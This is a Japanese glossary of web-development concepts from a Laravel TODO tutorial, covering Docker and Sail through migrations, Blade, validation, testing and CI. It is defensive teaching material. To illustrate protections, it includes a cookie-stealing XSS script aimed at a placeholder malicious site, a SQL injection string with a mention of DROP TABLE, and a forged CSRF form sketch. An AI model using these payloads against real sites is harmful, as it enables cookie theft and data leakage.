> あちらは「構文の読み方」を扱います。

# スプリント1で登場した概念

## 1. コンテナ/イメージ

**① 一言定義**: イメージは「アプリと実行環境一式を固めた設計図(読み取り専用)」、
コンテナは「イメージから起動した実行中のプロセス(隔離された箱)」。

**② なぜ必要か**: 「私のPCでは動くのに、あなたのPCでは動かない」事故を防ぐため。
PHPのバージョン違い、拡張モジュールの有無、OSの違い — 環境差はバグの温床です。
イメージに環境ごと閉じ込めれば、誰が起動しても同じ環境になります。
また、ホストに直接PHPやMySQLを入れないので、プロジェクトを消せば環境も綺麗に消せます。

**③ このリポジトリでの実例**:
- `mysql:8.4` イメージ → `todo-app-example2-mysql-1` コンテナ(DBサーバ)
- Sailがビルドする `sail-8.5/app` イメージ → `todo-app-example2-laravel.test-1` コンテナ(PHP実行環境)
- 確認コマンド: `./vendor/bin/sail ps`(→ [ステップ1-2](dev-walkthrough.md#ステップ1-2-envexample-をプロジェクト用に整備する))

## 2. Docker Composeとcompose.yaml

**① 一言定義**: 複数のコンテナ(アプリ+DBなど)を1つのファイル(`compose.yaml`)で
定義して、まとめて起動・停止する仕組み。

**② なぜ必要か**: コンテナを1個ずつ `docker run` で起動すると、ポート・ネットワーク・
起動順序などのオプションを毎回手で打つことになり、人によって起動方法がズレる事故が起きます。
compose.yamlに書いておけば「起動方法そのもの」をGitで共有できます。
さらに、Composeは**サービス名で名前解決できるネットワーク**を自動で作ります。

**③ このリポジトリでの実例**:
- `compose.yaml` に `laravel.test`(アプリ)と `mysql`(DB)の2サービスを定義
- `.env` の `DB_HOST=mysql` は IPアドレスではなく**サービス名**。
  アプリコンテナは「mysql」という名前でDBコンテナに接続している
  (→ [ステップ1-2](dev-walkthrough.md#ステップ1-2-envexample-をプロジェクト用に整備する))

## 3. ポートマッピング

**① 一言定義**: ホスト(あなたのPC)のポートとコンテナ内のポートを繋ぐ設定。
`8080:80` なら「ホストの8080番への通信をコンテナの80番へ転送」。

**② なぜ必要か**: コンテナは隔離されているので、繋がないとブラウザから届きません。
また、ホスト側の1つのポートは**1つのプロセスしか使えない**ため、複数プロジェクトを
動かすと衝突事故(`port is already allocated`)が起きます。だからこのプロジェクトでは
ポートを `.env` で明示し、変更可能にしています。

**③ このリポジトリでの実例**:
- `.env` の `APP_PORT=8080` → ブラウザで `http://localhost:8080`
- 実録: 予定していた `VITE_PORT=5174` が別プロジェクトと衝突し、5180に変更
  ([qa-log.md](qa-log.md))。空き確認は `ss -tlnp | grep 5174`

## 4. Composerと鶏と卵問題

**① 一言定義**: ComposerはPHPのパッケージ管理ツール。`composer.json`(欲しいものリスト)と
`composer.lock`(実際に入れたバージョンの記録)をもとに `vendor/` へライブラリを入れる。

**② なぜ必要か**: ライブラリを手でコピーして使うと、バージョンも出どころもバラバラになり、
セキュリティ修正も追えません(既知の脆弱性が残ったままのライブラリを使い続ける事故)。
`composer.lock` をコミットすることで「全員が全く同じバージョン」になります。
`vendor/` そのものは巨大なのでコミットせず、各自がComposerで復元します。
ここで**鶏と卵問題**が生まれます: このプロジェクトの `sail` コマンドは `vendor/` の中に
あるのに、`vendor/` を作るComposerはホストに入っていない —
解決策は「**Composer入りの使い捨てコンテナ**で最初の1回だけ `composer install` する」です。

**③ このリポジトリでの実例**:
- README「セットアップ手順 2」の `docker run ... laravelsail/php84-composer:latest composer install`
- 導入時も同じ考え方でインストーラをコンテナ内実行([ステップ1-1](dev-walkthrough.md#ステップ1-1-laravel本体をsail構成で導入する))

## 5. Laravel Sail

**① 一言定義**: Laravel公式の、Docker Compose一式を隠蔽してくれる開発環境。
実体は `compose.yaml` と、それを操作する薄いシェルスクリプト(`vendor/bin/sail`)。

**② なぜ必要か**: PHP・MySQL・拡張モジュールを全員が手で揃えるのは環境差事故のもと。
Sailなら `sail up -d` だけで揃います。押さえるべき仕組みは2つ:
- **.env駆動**: `APP_PORT` や `COMPOSE_PROJECT_NAME` など、compose.yamlの中の
  `${変数}` は `.env` から注入される。「設定は.envに集約」がSailの流儀
- **WWWUSERによる所有者問題の回避**: コンテナ内のプロセスがrootでファイルを書くと、
  ホスト側に「rootしか消せないファイル」ができる事故が起きる。sailスクリプトは
  起動時にホストのユーザーID(`WWWUSER`/`WWWGROUP`)をコンテナに渡し、
  コンテナ内でも同じIDでファイルを扱うことでこれを回避している
  (導入時の `docker run` に `-u "$(id -u):$(id -g)"` を付けたのも同じ理由)

**③ このリポジトリでの実例**:
- `./vendor/bin/sail up -d` で起動、コマンドは全て `./vendor/bin/sail artisan ...` に統一
- `.env` の `APP_PORT=8080 / VITE_PORT=5180 / COMPOSE_PROJECT_NAME=todo-app-example2`

## 6. .envと.env.example

**① 一言定義**: `.env` は「この環境だけの設定値(実物・Git管理外)」、
`.env.example` は「設定項目の見本(コミットする)」。

**② なぜ必要か**: 設定をコードに直書きすると、環境ごとに書き換えが必要になる上、
**DBパスワードやAPP_KEYのような秘密情報がGitHubに公開される事故**につながります
(公開リポジトリに漏れたAWSキーが数分で悪用される、は実際に多発している事故です)。
そこで「実物は各自の手元だけ、見本(項目名とダミー値)は共有」と分けます。
見本の整備を怠ると「クローンした人だけ動かない」事故になるため、
このプロジェクトでは **.env.example を正**とし、.envはそこからコピーして作ります。

**③ このリポジトリでの実例**:
- [ステップ1-2](dev-walkthrough.md#ステップ1-2-envexample-をプロジェクト用に整備する)で
  `.env.example` をMySQL・ポート明示に整備([コミット 1c97590](https://github.com/morisaki-yuichi/todo-app-example2/commit/1c97590))
- `.gitignore` に `.env` が入っていることも確認してみてください

## 7. artisan

**① 一言定義**: Laravel付属のコマンドラインツール。雛形生成(`make:...`)、
DB操作(`migrate`)、対話シェル(`tinker`)などをサブコマンドで提供する。

**② なぜ必要か**: ファイルを手で作ると、置き場所・クラス名・お作法が人によってズレます。
Laravelは「**設定より規約**」(決まった場所に決まった名前で置けば設定不要)の
フレームワークなので、規約に合ったファイルをジェネレータで作るのが最短で安全です。

**③ このリポジトリでの実例**:
- `./vendor/bin/sail artisan key:generate` / `sail artisan migrate`(スプリント1)
- スプリント2からは `make:model` などの雛形生成が登場予定

## 8. APP_KEY(アプリケーションの暗号化キー)

**① 一言定義**: Laravelがセッション・Cookie等を暗号化するための秘密鍵。
`php artisan key:generate` で生成され `.env` に保存される。

**② なぜ必要か**: 暗号化キーがなければCookie等を安全に扱えないため、Laravelは
起動を拒否します(500エラー)。また、**キーが漏れると暗号化Cookieを偽造される**
恐れがあるため、`.env` に置いてGit管理外にします。「キーをコミットしてしまい、
公開リポジトリで丸見え」は初学者が実際にやりがちな事故です。

**③ このリポジトリでの実例**:
- [実験1-A](dev-walkthrough.md#実験1-a-わざと失敗app_keyを空にして500を観察する)で
  わざと空にして500を観察 → ログ1行目 `No application encryption key has been specified.`

## 9. マイグレーション(導入編)

**① 一言定義**: データベースのテーブル構造の変更を、SQLではなくPHPのコードで
記述してバージョン管理する仕組み。`sail artisan migrate` で適用する。

**② なぜ必要か**: テーブルを手作業のSQLで作ると「誰がいつ何を流したか」が残らず、
開発者ごとにDBの形が違う事故が起きます。マイグレーションはGitで共有されるので、
クローンした人も `migrate` 一発で同じ構造を再現できます。

**③ このリポジトリでの実例**:
- スプリント1ではLaravel標準の3つ(users/cache/jobs)を適用しただけ
- 自分でテーブルを設計する話(up/down、カラム定義)は**スプリント2で詳しく扱います**

## 10. HTTPステータスコード(このプロジェクトで見る範囲)

**① 一言定義**: サーバがレスポンスに付ける3桁の結果コード。
2xx=成功、3xx=リダイレクト、4xx=クライアント側の問題、5xx=サーバ側の問題。

**② なぜ必要か**: 「なんか動かない」を機械的に切り分けるため。コードを見れば
**どちら側の・どんな問題か**が一瞬で絞れます。切り分けの第一歩として最強の手がかりです。

**③ このリポジトリでの実例**(登場したものから追記していきます):

| コード | 意味 | このリポジトリで見た場面 |
|---|---|---|
| 200 | 成功 | Welcome画面の表示確認(`curl -w "%{http_code}"`) |
| 302 | リダイレクト(ブラウザは**GETで**Location先を開き直す) | 作成成功→一覧へ / バリデーション差し戻し→フォームへ(スプリント3)。**302だけでは成否は分からず、行き先とセット**で読む |
| 404 | 見つからない | `/todos/99999`(存在しないID)。ルート順序ミスの`/todos/create`も404だった(実験3-A) |
| 405 | メソッド不一致(URLはあるがそのHTTPメソッドの定義がない) | GET専用の`/todos/create`へPOST(スプリント3で意図的に再現) |
| 419 | ページ期限切れ(実質CSRFトークン不備) | トークンなしPOST(スプリント3で意図的に再現)。@csrf忘れ・セッション切れで遭遇する |
| 500 | サーバ内部エラー | 実験1-AのAPP_KEY未設定 / 実験3-Bのバリデーションなし不正POST |
| (000) | ※HTTPコードではなくcurlの「接続不能」表示 | `.env`変更直後、開発サーバ再起動中にアクセスした瞬間 |

# スプリント3で登場した概念

## 21. HTTPメソッドの使い分けと「GETでデータを変えない原則」

**① 一言定義**: GET=取得(何度実行しても状態が変わらない)、POST=作成などの変更。
「データを変える操作をGETで作らない」が大原則。

**② なぜ必要か(事故例)**: 削除をGET(`/todos/1/delete` へのリンク)で作ると、
ブラウザのプリフェッチ(先読み)や検索エンジンのクローラが**リンクを辿っただけで
データが消える**事故が起きます(クローラが巡回してDBが空になった実話は有名)。
またGETはURLに履歴が残り、再訪問で同じ操作が再実行されてしまいます。

**③ このリポジトリでの実例**: 作成は `POST /todos`
([ステップ3-1](dev-walkthrough.md#ステップ3-1-作成フォームと保存処理を作る))。
編集・削除もすべてPOST系で実装します(スプリント4)。

## 22. CSRFと@csrf

**① 一言定義**: CSRF(クロスサイトリクエストフォージェリ)=ログイン済みユーザーを
攻撃サイトから**勝手にPOSTさせる**攻撃。@csrfはその対策トークンを埋めるBlade記法。

**② なぜ必要か(攻撃の仕組み)**: あなたが銀行サイトにログイン中、悪意あるページを
開いたとします。そのページに `<form action="https://銀行/送金" method="POST">` と
自動送信スクリプトが仕込まれていると、**ブラウザはCookieを自動で付けて送信**するため、
サーバは「本人からの送金依頼」と区別できません。対策: サーバは自分が配ったフォームに
**ランダムなトークン**を埋め、POST時に照合します。攻撃サイトはトークンを知り得ない
(他サイトのHTMLは読めない)ので、偽造POSTは419で弾かれます。
※ 補助的にRefererヘッダ(どのページから来たか)の検証を使うサイトもあります。

**③ このリポジトリでの実例**: `create.blade.php` の `@csrf`。トークンなしPOSTが419になる
ことをcurlで再現済み。トークン+Cookieを正しく送る「正規のcurl手順」は
[ステップ3-1の動作確認(CLI)](dev-walkthrough.md#ステップ3-1-作成フォームと保存処理を作る)。

## 23. バリデーション(自動差し戻し・old値・境界値)

**① 一言定義**: 入力値の検証。`$request->validate([ルール])` は違反時に
自動でフォームへ302リダイレクトし(自動差し戻し)、エラーと入力値を持ち帰る。

**② なぜ必要か(事故例)**: 実験3-Bで実証したとおり、バリデーションなしでは
不正な入力がそのままDBに到達し、**利用者に500エラー**を見せます(titleなし→
`Field 'title' doesn't have a default value`)。また差し戻しで入力値が消える
フォームは、長文を書いた利用者を確実に失望させます — `old()` での復元は必須です。
検証では**境界値**(100文字=OK/101文字=NG)を必ず確認します。「だいたい動く」と
「仕様どおり動く」の差はいつも境界にあります。

**③ このリポジトリでの実例**: `TodoController::store()` の `validate()`、
`create.blade.php` の `$errors->all()` と `old()`
([ステップ3-2](dev-walkthrough.md#ステップ3-2-バリデーションを入れる))。
メッセージはLaravel標準の英語のまま(日本語化は言語ファイルが必要でスコープ外)。

## 24. PRGパターン

**① 一言定義**: POST → Redirect → GET。POSTの処理結果を直接HTMLで返さず、
302リダイレクトでGETのページに誘導する定石。

**② なぜ必要か(事故例)**: POSTに直接HTMLを返すと、利用者がF5を押すたび
「フォーム再送信しますか?」の警告が出て、OKすると**同じTODOが二重・三重に登録**
されます。302を受けたブラウザは**GETで**開き直すため、以降どれだけリロードしても
起きるのは「一覧の再表示」だけになります。
※ curlで検証するとき `-X POST` と `-L` を併用すると、この「GETに切り替える」挙動が
再現されず419になります(実録: [ステップ3-3](dev-walkthrough.md#ステップ3-3-フラッシュメッセージを出す))。

**③ このリポジトリでの実例**: `store()` の `return redirect()->route('todos.index')`。
ブラウザで作成→F5して二重登録されないことを確認済み。

## 25. フラッシュデータ

**① 一言定義**: **次の1リクエストだけ**生きるセッション値。
`redirect()->with('status', 'メッセージ')` で積み、`session('status')` で読む。

**② なぜ必要か**: PRGでリダイレクトすると「成功した」という情報が次のページに
渡りません。かといって普通のセッションに入れると、**消し忘れて何度も表示される**
バグになります(「作成しました」が翌日も出ている画面、見たことありませんか)。
1回読まれたら自動で消える器がちょうどいい。

**③ このリポジトリでの実例**: `store()` の `->with('status', 'TODOを作成しました。')` と
`layouts/app.blade.php` の表示。**リロードすると消える**ことを確認済み
([ステップ3-3](dev-walkthrough.md#ステップ3-3-フラッシュメッセージを出す))。

# スプリント4で登場した概念

## 26. メソッドスプーフィング(@method)

**① 一言定義**: HTMLフォームはGET/POSTしか送れないため、
`<input type="hidden" name="_method" value="PUT">`(Bladeでは `@method('PUT')`)で
「本当はPUT/PATCH/DELETEのつもり」とLaravelに伝える仕組み。

**② なぜ必要か**: ルートを「更新=PUT、削除=DELETE」とHTTPメソッドで意味づけすると、
URLが同じでも操作を区別でき、route:listが操作の一覧表として読めるようになります。
しかしブラウザのフォームがPOSTしか送れない以上、偽装の仕組みが要ります。
重要な性質: **スプーフィングはPOSTでしか効きません**。GETに `?_method=DELETE` を
付けても無視される(=リンクを踏んだだけで削除される事故は構造的に起きない)ことを
実験4-Bで確認しました。

**③ このリポジトリでの実例**: 編集フォームの `@method('PUT')`、トグルの
`@method('PATCH')`、削除の `@method('DELETE')`。@methodを外すと405になる実験は
[実験4-A](dev-walkthrough.md#実験4-a-わざと失敗methodputを外してみる)。

## 27. 確認ページ方式

**① 一言定義**: 破壊的操作(削除など)の前に、専用ページで対象を見せて
「本当に実行するか」を確認させるUIパターン。GET(確認=表示のみ)と
DELETE(実行)の2段構成。

**② なぜ必要か**: 誤操作したユーザーのデータは戻りません。JSの `confirm()` に
頼らない場合(本プロジェクトの技術制約)、サーバ側のページ遷移で確認を挟むのが定石です。
副次的な利点として、確認ページには**対象の詳細を表示できる**ため、
「どれを消そうとしているか」がダイアログより明確になります。
設計の要点は「確認ページのGETでは絶対にデータを変えない」こと
(→ [概念21: GETでデータを変えない原則](#21-httpメソッドの使い分けとgetでデータを変えない原則))。

**③ このリポジトリでの実例**: `GET /todos/{todo}/delete`(confirm-destroy.blade.php)→
`DELETE /todos/{todo}`([ステップ4-3](dev-walkthrough.md#ステップ4-3-削除を確認ページ方式で作る))。
GETで消えないことは実験4-Bで3パターン検証済み。

## 28. 設定の2段構え(環境変数→config→アプリ)

**① 一言定義**: 設定値は「.env(環境ごとの値)→ config/*.php(アプリの設定窓口)→
アプリコードは `config('app.name')` で読む」という2段構えで流れる。

**② なぜ必要か**: アプリコードのあちこちで `env('APP_NAME')` を直接読むと、
本番で `config:cache`(設定のキャッシュ)を有効にした瞬間に **env()がnullを返して壊れる**
という有名な事故があります。「env()を読んでいいのはconfigファイルの中だけ」という
規約に従えば、コードは常にconfig経由で安全になり、設定の在り処も一覧できます。

**③ このリポジトリでの実例**: レイアウトのタイトル `{{ config('app.name') }}`。
`.env` の `APP_NAME="TODO App"` → `config/app.php` の `'name' => env('APP_NAME', ...)` →
ビュー、という流れを実際に辿ってみてください。

## 29. DRY(Don't Repeat Yourself)

**① 一言定義**: 同じ「知識」を2箇所以上に書かない原則。片方だけ直して
もう片方を忘れる事故(修正漏れ)を構造的に防ぐ。

**② なぜ必要か(事故例)**: URLをビューに直書きしていると、URL変更時に1箇所だけ
直して他が404になる — 名前つきルート(概念12)やレイアウト継承(概念19)は
DRYの実践です。一方で本リポジトリには**あえて残した重複**があります:
`store()` と `update()` のバリデーションルールです。共通化(FormRequestクラス)は
可能ですが、初級教材としては「ルールがその場に書いてある」読みやすさを優先しました。
**DRYは絶対律ではなく、重複のコストと抽象化のコストの天秤**である、という実例です
(2箇所ならコメントで相互参照し、レビューで同期を確認する、が現実的な運用)。

**③ このリポジトリでの実例**: DRYの実践=名前つきルート・レイアウト・部分的な
シーダー共通化。意図的な重複=TodoControllerのバリデーションルール2箇所
([ステップ4-1](dev-walkthrough.md#ステップ4-1-編集機能を作る)で解説)。

# スプリント2で登場した概念

## 11. MVCとリクエストの流れ

**① 一言定義**: アプリをModel(データと業務ルール)/View(見た目)/
Controller(受付と交通整理)の3役に分ける設計。Laravelでは
**ルート → コントローラ → モデル → ビュー → レスポンス**の順に流れる。

**② なぜ必要か**: 1ファイルにSQL・HTML・処理を全部書くと、変更のたびに全体を壊す
リスクがあり、どこを直せばいいかも分からなくなります(昔のPHPで頻発した事故)。
役割を分けると「表示だけ変えたい→ビュー」「保存ルールを変えたい→モデル」と
**直す場所が一意に決まり**、エラーの切り分けも層単位でできます。

**③ このリポジトリでの実例**: `/todos` へのアクセスは
`routes/web.php` → `TodoController::index()` → `Todo`モデル → `todos/index.blade.php`
の順に流れる([ステップ2-3](dev-walkthrough.md#ステップ2-3-todo一覧画面を作る))。

## 12. ルーティングと名前つきルート

**① 一言定義**: 「このURL+HTTPメソッドが来たら、この処理へ」という対応表
(`routes/web.php`)。`->name('todos.index')` を付けると**URLに名前**が付く。

**② なぜ必要か**: ビューの中にURLを直書き(`/todos`)すると、URL変更時に
全ファイルを書き換える事故が起きます。名前(`route('todos.index')`)で参照すれば、
URLを変えてもルート定義1行の修正で済みます(DRY: 同じ知識を2箇所に書かない)。

**③ このリポジトリでの実例**: `route('todos.show', $todo)` で詳細へのリンクを生成
([ステップ2-4](dev-walkthrough.md#ステップ2-4-todo詳細画面とリンクを作る))。
※ ルートの**定義順序**が問題になる実例(`/todos/create` と `/todos/{todo}`)は
スプリント3で登場予定です。

## 13. マイグレーションのup/downとカラム定義

**① 一言定義**: `up()` は変更の適用(テーブル作成など)、`down()` はその取り消し。
カラムは `$table->string('title', 100)` のようにPHPで宣言する。

**② なぜ必要か**: down()が壊れていると「一歩戻ってやり直す」ことができず、
DBを作り直すしかなくなります(チーム開発ではDB共有者全員を巻き込む事故)。
また `string('title', 100)` のように**DB層でも長さを制限**しておくと、
アプリ側のバリデーションをすり抜けたデータもDBが最後の砦として弾きます。

**③ このリポジトリでの実例**: `database/migrations/*_create_todos_table.php`。
適用後すぐ `migrate:rollback --step=1` → `migrate` でdown()を検証した
([ステップ2-1](dev-walkthrough.md#ステップ2-1-todosテーブルとtodoモデルを作る))。

## 14. Eloquentと「設定より規約」

**① 一言定義**: EloquentはLaravelのORM(テーブルの行をPHPオブジェクトとして
扱う仕組み)。「**設定より規約**」= 決まった名前・場所に従えば設定ファイル不要。

**② なぜ必要か**: 「モデル名は単数(Todo)、テーブル名は複数(todos)」という規約に
従うだけで、対応関係の設定を一切書かずに動きます。設定が少ない=設定ミスという
事故も減る。逆に規約を知らないと「設定してないのになぜ動く?」と混乱するので、
**規約の存在自体を知っておく**ことが重要です。

**③ このリポジトリでの実例**: `Todo` モデルは何も設定していないのに `todos`
テーブルを読み書きする。`$todo->title` のようにカラムがそのままプロパティになる。

## 15. $fillableとマスアサインメント

**① 一言定義**: マスアサインメントは `Todo::create($配列)` のように**複数カラムを
一括代入**すること。`$fillable` は「一括代入を許すカラムの許可リスト」。

**② なぜ必要か(攻撃例)**: フォーム入力を `User::create($request->all())` のように
丸ごと保存する実装だと、攻撃者がフォームに `is_admin=1` という**勝手なフィールドを
追加して送信**するだけで管理者に昇格できてしまいます(実在する典型的攻撃)。
Laravelは「許可リストにあるカラムだけ一括代入できる」ことでこれを防ぎ、
未設定なら安全側に倒して例外(MassAssignmentException)を投げます。

**③ このリポジトリでの実例**: [実験2-A](dev-walkthrough.md#実験2-a-わざと失敗fillableなしでcreateしてみる)で
$fillableなしのcreateを実行し、例外を観察 → `app/Models/Todo.php` に
`$fillable = ['title', 'description', 'completed']` を定義して解消。

## 16. casts(型キャスト)

**① 一言定義**: DBから読んだ値をPHPの型へ自動変換する設定(モデルの `casts()`)。

**② なぜ必要か**: MySQLに `boolean` 型はなく、実体は `tinyint(1)`(0か1の数字)。
castsがないと `$todo->completed` は `"1"` のような文字列/数値で返り、
`=== true` の比較が失敗する型バグ(気づきにくい事故)の温床になります。

**③ このリポジトリでの実例**: `Todo` の `casts()` で `'completed' => 'boolean'`。
tinkerで `completed => 1` を保存して `var_dump` すると `bool(true)` が返ることを確認した
([ステップ2-1](dev-walkthrough.md#ステップ2-1-todosテーブルとtodoモデルを作る))。

## 17. tinker

**① 一言定義**: Laravelアプリを読み込んだ状態で起動する対話シェル(REPL)。
モデル操作などをその場で実行できる(`sail artisan tinker`)。

**② なぜ必要か**: 画面を全部作ってから「動かない」と気づくと、原因候補が
ルート・コントローラ・モデル・ビューの全部になります。tinkerで**モデル層だけを
先に検証**しておけば、後で問題が起きても「モデルは検証済み、原因はそれより外側」と
探索範囲を半分にできます。

**③ このリポジトリでの実例**: 実験2-Aと、`Todo::create` / `count()` の事前検証、
`latest()` の並び不定の発見([ステップ2-3](dev-walkthrough.md#ステップ2-3-todo一覧画面を作る)の実録)。

## 18. シーダー

**① 一言定義**: 動作確認用などのデータをプログラムで投入する仕組み
(`sail artisan db:seed`)。

**② なぜ必要か**: 手作業でデータを入れると、人によって・タイミングによって
DBの中身が違い、「自分の環境でだけ再現するバグ」という沼にはまります。
シーダーなら誰でも同じデータを何度でも再現でき、**画面の全分岐を確認できる
データ構成**(完了/未完了、内容あり/なし)を意図して設計できます。

**③ このリポジトリでの実例**: `database/seeders/TodoSeeder.php`。
先頭でdeleteしてから入れ直す**冪等**方式(2回実行しても3件のまま)
([ステップ2-2](dev-walkthrough.md#ステップ2-2-シーダーでダミーデータを入れる))。

## 19. Bladeテンプレート(@extends/@yield、{{ }} のXSS対策)

**① 一言定義**: LaravelのHTMLテンプレート。`@extends`/`@yield` で共通レイアウトを
継承し、`{{ $変数 }}` で値を**自動エスケープして**出力する。

**② なぜ必要か(攻撃例)**: エスケープせずに出力すると、TODOのタイトルに
`<script>document.location='https://悪意のサイト?c='+document.cookie</script>` と
入力されただけで、閲覧者のCookieが盗まれます(**XSS: クロスサイトスクリプティング**)。
Bladeの `{{ }}` は自動でHTMLエスケープするので、この攻撃文字列は「ただの文字」として
無害に表示されます。また@extendsによるレイアウト共通化は、ヘッダー修正を
全ページに書き直す事故(DRY違反)を防ぎます。

**③ このリポジトリでの実例**: `resources/views/layouts/app.blade.php`(骨格)と
`todos/index.blade.php` / `todos/show.blade.php`(@extendsで継承)。
出力はすべて `{{ }}` を使用([ステップ2-3](dev-walkthrough.md#ステップ2-3-todo一覧画面を作る))。

## 20. ルートモデルバインディングと404

**① 一言定義**: コントローラの引数を `show(Todo $todo)` のようにモデル型で宣言すると、
URLの `{todo}` 部分から対応レコードを自動取得してくれる仕組み。
見つからなければ自動で404を返す。

**② なぜ必要か**: 自前で `Todo::find($id)` を書くと、**nullチェックを忘れた場合に**
`Attempt to read property "title" on null` の500エラーになります。500は「サーバが
壊れている」の意味で、利用者を不安にさせ、デバッグ画面から内部情報が漏れる恐れも
あります。バインディングなら「見つからない=404」を確実に・全箇所で統一できます。

**③ このリポジトリでの実例**: `TodoController::show(Todo $todo)`。
`curl /todos/99999` で404を確認済み([ステップ2-4](dev-walkthrough.md#ステップ2-4-todo詳細画面とリンクを作る))。

# 第2部・スプリント5で登場した概念

## 30. 追加マイグレーション(稼働中テーブルの変更)

**① 一言定義**: 既存テーブルにカラムを足す等の変更を、**新しいマイグレーション
ファイルを追加して**行う手法(`make:migration --table=xxx`)。

**② なぜ必要か**: マイグレーションは「DBの変更履歴」です。既に他の環境
(本番・チームメンバーのDB)で**適用済みのマイグレーションを書き換えても、
その環境では二度と実行されない**ため、変更が反映されず環境ごとにDB構造が
食い違う事故になります。歴史は書き換えず追記する。さらに、稼働中テーブルへの
カラム追加は既存レコードのことを考え、**NOT NULLではなくnullable**にします
(NOT NULLだと既存行が値を持てずマイグレーション自体が失敗する)。

**③ このリポジトリでの実例**: `add_due_date_to_todos_table`。
既存の3件がNULLのまま生き残り、rollbackでもデータが消えないことを確認
([ステップ5-1](dev-walkthrough.md#ステップ5-1-due_dateカラムを追加する追加マイグレーション))。

## 31. クエリパラメータとGET絞り込み

**① 一言定義**: URLの `?status=open&keyword=牛乳` の部分がクエリパラメータ。
検索・絞り込みのように**状態を変えない操作**は、これをGETで受け取る。

**② なぜ必要か**: 絞り込みは「見るだけ」なので
[GETでデータを変えない原則](#21-httpメソッドの使い分けとgetでデータを変えない原則)から
GETが正解。GETフォームには**CSRFトークンが不要**です(何も変更しないため)。
副次的な利点として、条件がURLに乗るので**結果を共有・ブックマーク**でき、
ブラウザの戻る/進むも自然に効きます。実装では演算子の優先順位に注意:
`AND`条件と`OR`条件を混ぜるときは、ORの群れをクロージャで括らないと
意図しない結果になります。

**③ このリポジトリでの実例**: `TodoController::index(Request $request)` の
`$request->query('status', 'all')` と、orWhereをクロージャで括ったキーワード検索。
GETフォームは `todos/index.blade.php`
([ステップ5-3](dev-walkthrough.md#ステップ5-3-状態キーワードの絞り込み))。

## 32. SQLインジェクションとプレースホルダ

**① 一言定義**: 利用者の入力をSQL文に**文字列連結**で埋め込むと、入力に含めた
SQL断片が命令として実行されてしまう攻撃(SQLインジェクション)。防御は
**プレースホルダ**(値を「文字列」として安全に差し込む仕組み)。

**② なぜ必要か(攻撃の実演)**: 実験5-Aで、キーワードに `' OR '1'='1` を入れると、
連結で組んだSQLは `... where title like '%' OR '1'='1%'` となり **WHEREが常に真=
全件漏洩**しました。実際の攻撃ではこれで他人の全データ取得、`; DROP TABLE` で
テーブル破壊まで起こり得ます(情報漏洩事故の定番)。プレースホルダ(`?` と値の分離)
を使うと、入力は必ず「値」として扱われ、SQL構造を壊せません。

**③ このリポジトリでの実例**: 絞り込みは Eloquent の `where('title','like', "%..%")` を
使用。内部でプレースホルダに変換されるため安全。実験5-Aで連結(全件漏れ)と
プレースホルダ/Eloquent(0件)を比較実演
([実験5-A](dev-walkthrough.md#実験5-a-sqlインジェクションを安全に体験する))。

## 33. ページネーションとwithQueryString

**① 一言定義**: 一覧を数件ずつのページに分割する仕組み(`paginate(5)`)。
`withQueryString()` は、ページ移動リンクに現在のクエリパラメータを引き継ぐメソッド。

**② なぜ必要か**: 全件を1ページに出すと、件数が増えたとき表示が重く見通しも悪く
なります。ページ分割で解決しますが、**絞り込みとの併用に注意**:
`withQueryString()` を忘れると、2ページ目に進んだ瞬間に絞り込み条件が消える
バグになります。また、ページ番号は利用者が自由に書き換えられる入力なので、
不正値(`page=abc`)で落ちないことの確認が要ります(Laravelはリクエストの
page値を検証して1に丸めるため、HTTP経由なら安全)。

**③ このリポジトリでの実例**: `index()` の `paginate(5)->withQueryString()` と、
CSSフレームワーク非依存の自前ビュー `pagination/simple.blade.php`。
`page=abc/999/-1` がいずれも200になることを確認
([ステップ5-4](dev-walkthrough.md#ステップ5-4-ページネーション)、
[実験5-B](dev-walkthrough.md#実験5-b境界-不正な-page-値と-http境界のありがたみ))。

# 第2部・スプリント6で登場した概念

## 34. 自動テストとRefreshDatabase

**① 一言定義**: 自動テストは「期待する振る舞い」をコードで書き、機械に何度でも
検証させる仕組み。Featureテストは実際にHTTPリクエストを送って応答を検証する。
`RefreshDatabase` は各テストの前にテスト用DBを作り直すトレイト。

**② なぜ必要か**: 手作業の確認は「毎回・全部・正確に」が続きません(人は飽きるし
忘れる)。自動テストがあれば、コードを変えるたびに全確認を一瞬で回せ、
**壊れたことがその場で分かる**。特に大きな改修(次スプリントの認証)の前に
テストを揃えておくと、「意図せず既存機能を壊した」を即検知できます。
`RefreshDatabase` が要るのは、テスト同士がデータを共有すると「実行順で結果が
変わる」不安定なテスト(テスト汚染)になるから。**開発DB(todo_app)ではなく
testing DB**に対して動くので、開発データは消えません(phpunit.xmlの設定)。

**③ このリポジトリでの実例**: `tests/Feature/Todo*Test.php`(20本)と
`tests/Unit/TodoOverdueTest.php`。手作業のcurl確認をテストに翻訳した
([ステップ6-2](dev-walkthrough.md#ステップ6-2-crud絞り込みのfeatureテスト手作業の写経))。
「一度赤を見てから緑にする」理由は
[実験6-A](dev-walkthrough.md#実験6-a-赤を見てから緑にするtry-t-12)。

## 35. ファクトリ(テストデータの工場)

**① 一言定義**: テスト用のモデルデータを既定値つきで量産する仕組み
(`Todo::factory()->create()`)。状態メソッド(`->completed()`)で変種も作れる。

**② なぜ必要か**: テストのたびに全カラムを手で埋めると、本質でない項目まで
書くことになり、テストの意図が埋もれます。ファクトリに既定値を持たせれば、
テストは**注目する項目だけ**を上書きすればよく、読みやすくなります
(例: 完了状態を試すテストは `->completed()` だけ書けばよい)。

**③ このリポジトリでの実例**: `database/factories/TodoFactory.php`
(`completed()` / `overdue()` 状態つき)。モデルに `use HasFactory` を追加
([ステップ6-1](dev-walkthrough.md#ステップ6-1-ファクトリとredgreen実験6-a))。

## 36. CI(GitHub Actions)

**① 一言定義**: CI(継続的インテグレーション)は、コードを共有リポジトリに
push/PRするたびに**自動でテスト等を実行**する仕組み。GitHub Actionsはその
GitHub版で、`.github/workflows/*.yml` に手順を書く。

**② なぜ必要か**: 「手元では通る」は環境差で崩れます(暗黙のインストール、
追跡されていないファイル…)。CIは**まっさらな環境で毎回再現**するので、
そうした隠れた依存を暴きます。実際このプロジェクトでも、gitが追跡しない
空ディレクトリ(tests/Unit)が原因でCIだけが赤くなり、問題を早期に発見できました
(→ [実験6-B](dev-walkthrough.md#実験6-b-ciが赤くなるのを見るそして直す))。
PRにテスト結果が出るので、レビュー前に「壊れたPR」が一目で分かります。

**③ このリポジトリでの実例**: `.github/workflows/ci.yml`。
MySQLをサービスコンテナとして起動し(ローカルのSailと同じ役割)、
`composer install` → `key:generate` → `php artisan test` を実行。
ログの読み方は `gh run view <RID> --log-failed`
